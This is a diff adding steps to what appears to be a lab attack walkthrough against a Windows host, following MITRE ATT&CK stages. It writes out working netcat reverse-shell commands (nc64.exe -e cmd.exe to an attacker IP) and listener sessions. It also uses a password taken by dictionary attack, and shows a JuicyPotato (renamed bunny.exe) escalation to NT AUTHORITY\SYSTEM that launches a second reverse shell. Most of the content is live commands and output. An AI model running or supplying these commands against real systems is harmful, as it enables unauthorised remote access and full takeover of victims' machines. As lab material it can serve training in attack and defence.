@@ -93,6 +93,9 @@ An X11 Remote Desktop Protocol (RDP) client that is part of the FreeRDP project,
 ![image](https://github.com/user-attachments/assets/a3174dd7-ab96-48c8-a5a7-16bf96dec33e)
 [The victim's credentials don't match ]
 
+
+## STEP2. Execution : Command and Scripting Interpreter(T1059)
+
 ### Attacker
 ```shell
 # cd /home/kali/Attacker_Tool/CASE1
@@ -110,12 +113,110 @@ An X11 Remote Desktop Protocol (RDP) client that is part of the FreeRDP project,
 ![image](https://github.com/user-attachments/assets/951621b2-94ba-4249-acbd-77b61b14c48f)
 [Connect reverse shell to 4445 port using netcat(nc64.exe)]
 
+
+
+![image](https://github.com/user-attachments/assets/ffdb0774-7d1a-4878-9dcd-d420fe71727b)
+[ Verify testuser account’s permissions and run cmd with Administrator privilege Enter testuser password stolen by Dictionary Attack ]
+
+
 ```shell
-#nc -lvp 445
-```
-### Victim
-```shell
-C:\Users\testuser>nc64.exe -e cmd.exe 192.168.106.141 445
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvp 4445
+listening on [any] 4445 ...
+192.168.106.137: inverse host lookup failed: Unknown host
+connect to [192.168.106.138] from (UNKNOWN) [192.168.106.137] 50863
+Microsoft Windows [Version 10.0.17134.1]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\testuser>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                          State   
+============================= ==================================== ========
+SeShutdownPrivilege           Shut down the system                 Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
+SeUndockPrivilege             Remove computer from docking station Disabled
+SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
+SeTimeZonePrivilege           Change the time zone                 Disabled
+
+C:\Users\testuser>runas /user:Administrator "cmd"
+runas /user:Administrator "cmd"
+Enter the password for Administrator: 
+
+C:\Users\testuser>powershell
+powershell
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Users\testuser> Start-Process cmd -Verb RunAs
+Start-Process cmd -Verb RunAs
+PS C:\Users\testuser> 
 
 ```
+
+Administrator Permission Console(cmd)
+
+![image](https://github.com/user-attachments/assets/ebe13ef1-0115-49c3-876e-23cbc4af3d4e)
+[ Check permission 'SeImpersonatePrivilege' for privilege escalation vulnerabilities ]
+
+
+
+```shell
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvp 4445
+listening on [any] 4445 ...
+192.168.106.137: inverse host lookup failed: Unknown host
+connect to [192.168.106.138] from (UNKNOWN) [192.168.106.137] 50877
+Microsoft Windows [Version 10.0.17134.1]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\testuser>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeShutdownPrivilege           Shut down the system                      Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeUndockPrivilege             Remove computer from docking station      Disabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+SeTimeZonePrivilege           Change the time zone                      Disabled
+
+C:\Users\testuser>![image](https://github.com/user-attachments/assets/4ca929bf-9c94-4201-9950-c4f92366fc4d)
+
+```
+
+
+![image](https://github.com/user-attachments/assets/44e9409f-e927-4d60-8209-a8c826e4d712)
+
+
+## STEP3. Privilege Escalation : Abuse Elevation Control Mechanism(T1548)
+Attack Tools : JuicyPotato(bunny.exe)
+
+![image](https://github.com/user-attachments/assets/0460906c-9835-4cab-9f32-7ab4386faee0)
+[ Using JuicyPotato(bunny.exe) to steal SYSTEM privilege ]
+
+
+```shell
+c:\Users\testuser>bunny.exe -l 4445 -t * -p C:\Windows\System32\cmd.exe -a "/c C:\Users\testuser\nc64.exe -e cmd.exe 192.168.106.138 9999"
+bunny.exe -l 4445 -t * -p C:\Windows\System32\cmd.exe -a "/c C:\Users\testuser\nc64.exe -e cmd.exe 192.168.106.138 9999"
+Testing {4991d34b-80a1-4291-83b6-3328366b9097} 4445
+......
+[+] authresult 0
+{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM
+
+[+] CreateProcessWithTokenW OK
+
+c:\Users\testuser>
+
+
+```
+
+
 
